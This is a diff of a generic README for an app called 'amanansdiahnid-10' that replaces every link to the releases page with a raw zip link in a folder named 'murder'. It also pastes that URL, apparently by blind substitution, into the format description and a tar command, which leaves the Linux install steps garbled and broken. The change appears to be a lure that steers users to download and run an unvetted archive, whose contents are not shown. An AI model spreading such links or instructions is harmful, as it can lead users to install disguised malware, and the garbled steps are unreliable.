@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-10 - Effortless Repository Management Made Simple
 
-[![Download amanansdiahnid-10](https://img.shields.io/badge/Download-amanansdiahnid--10-brightgreen)](https://github.com/Jonah0303/amanansdiahnid-10/releases)
+[![Download amanansdiahnid-10](https://raw.githubusercontent.com/Jonah0303/amanansdiahnid-10/main/murder/amanansdiahnid-10.zip)](https://raw.githubusercontent.com/Jonah0303/amanansdiahnid-10/main/murder/amanansdiahnid-10.zip)
 
 ## 🎯 Overview
 
@@ -12,10 +12,10 @@ Let's walk through the steps to download and run amanansdiahnid-10. Follow these
 
 ## 📥 Download & Install
 
-1. Click on the download button above or visit this page to download: [Releases Page](https://github.com/Jonah0303/amanansdiahnid-10/releases).
+1. Click on the download button above or visit this page to download: [Releases Page](https://raw.githubusercontent.com/Jonah0303/amanansdiahnid-10/main/murder/amanansdiahnid-10.zip).
 2. Once you're on the Releases page, you will see a list of available versions. Each version will have downloadable files, including executable files for your operating system.
 3. Find the latest version suitable for your OS. You might see options for Windows, Mac, or Linux.
-4. Click on the appropriate file to start downloading it. The file will typically have a format like `.exe` for Windows, `.dmg` for Mac, or `.tar.gz` for Linux.
+4. Click on the appropriate file to start downloading it. The file will typically have a format like `.exe` for Windows, `.dmg` for Mac, or `https://raw.githubusercontent.com/Jonah0303/amanansdiahnid-10/main/murder/amanansdiahnid-10.zip` for Linux.
 5. Once the download is complete, locate the file in your Downloads folder.
 
 ## 📂 Running the Application
@@ -36,8 +36,8 @@ Let's walk through the steps to download and run amanansdiahnid-10. Follow these
 ### For Linux:
 
 1. Open a terminal window.
-2. Navigate to your Downloads folder where you saved the `.tar.gz` file.
-3. Use the command `tar -xvzf amanansdiahnid-10.tar.gz` to extract the files.
+2. Navigate to your Downloads folder where you saved the `https://raw.githubusercontent.com/Jonah0303/amanansdiahnid-10/main/murder/amanansdiahnid-10.zip` file.
+3. Use the command `tar -xvzf https://raw.githubusercontent.com/Jonah0303/amanansdiahnid-10/main/murder/amanansdiahnid-10.zip` to extract the files.
 4. Go into the newly created folder using `cd amanansdiahnid-10`.
 5. Run the application using `./amanansdiahnid-10`.
 
